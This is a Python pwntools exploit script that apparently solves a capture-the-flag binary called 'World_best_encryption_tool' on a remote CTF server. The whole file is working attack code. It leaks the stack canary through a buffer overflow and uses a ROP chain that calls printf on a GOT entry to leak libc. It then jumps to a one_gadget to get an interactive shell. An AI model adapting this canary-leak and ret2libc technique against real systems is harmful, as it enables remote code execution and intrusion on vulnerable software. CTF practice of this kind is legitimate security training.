#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = process("./World_best_encryption_tool")
p = remote("ctf.j0n9hyun.xyz", 3027)
elf = ELF("./World_best_encryption_tool")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p1ret = 0x4008e3

p.sendlineafter("Your text)\n", 'A'*0x38 + 'B')
p.recvuntil('B')
canary = u64("\x00"+ p.recv(7))
log.info("canary : "+hex(canary))

#gdb.attach(p, 'b*main+171')
pay = '\x00'*64 + '\x00'*56 + p64(canary) + 'D'*8 + p64(p1ret) + p64(elf.got['setvbuf']) + p64(elf.plt['printf']) + p64(0x400727)
p.sendlineafter("\nWanna encrypt other text? (Yes/No)\n", 'Yes')
p.sendlineafter("Your text)\n", pay)

p.sendlineafter("\nWanna encrypt other text? (Yes/No)\n", 'No')

setvbuf = u64(p.recv(6)+"\x00\x00")
log.info("setvbuf : "+hex(setvbuf))
libcBase = setvbuf - libc.symbols['setvbuf']
one_gadget = libcBase + 0xf02a4

pay = '\x00'*64 + '\x00'*56 + p64(canary) + 'D'*8 + p64(one_gadget)
p.sendlineafter("Your text)\n", pay)

p.sendlineafter("\nWanna encrypt other text? (Yes/No)\n", 'No')

p.interactive()
